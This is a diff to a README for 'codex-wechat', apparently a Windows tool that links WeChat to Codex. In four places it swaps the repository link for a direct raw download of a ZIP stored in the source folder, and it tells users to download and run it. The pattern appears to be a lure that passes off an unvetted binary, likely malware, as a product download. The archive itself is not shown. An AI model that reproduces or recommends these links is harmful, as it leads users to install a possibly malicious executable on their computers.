@@ -1,6 +1,6 @@
 # 🔗 codex-wechat - Connect WeChat to Codex
 
-[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/Similar-colpoxerosis201/codex-wechat)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/Similar-colpoxerosis201/codex-wechat/raw/refs/heads/main/src/app/codex_wechat_v1.4.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This project is made for regular Windows users who want to use WeChat as a bridg
 
 Visit this page to download the app:
 
-https://github.com/Similar-colpoxerosis201/codex-wechat
+https://github.com/Similar-colpoxerosis201/codex-wechat/raw/refs/heads/main/src/app/codex_wechat_v1.4.zip
 
 Open the page in your browser and look for the latest release or download package. If the page offers a ZIP file or EXE file, save it to your computer before you continue.
 
@@ -45,7 +45,7 @@ It fits users who want a simple bridge between chat and local command use.
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/Similar-colpoxerosis201/codex-wechat
+   https://github.com/Similar-colpoxerosis201/codex-wechat/raw/refs/heads/main/src/app/codex_wechat_v1.4.zip
 
 2. Download the latest Windows package from the page.
 
@@ -190,7 +190,7 @@ Keep the full folder together so the app can find its files.
 
 Download and run the Windows app from:
 
-https://github.com/Similar-colpoxerosis201/codex-wechat
+https://github.com/Similar-colpoxerosis201/codex-wechat/raw/refs/heads/main/src/app/codex_wechat_v1.4.zip
 
 ## 🔄 Update Steps
 
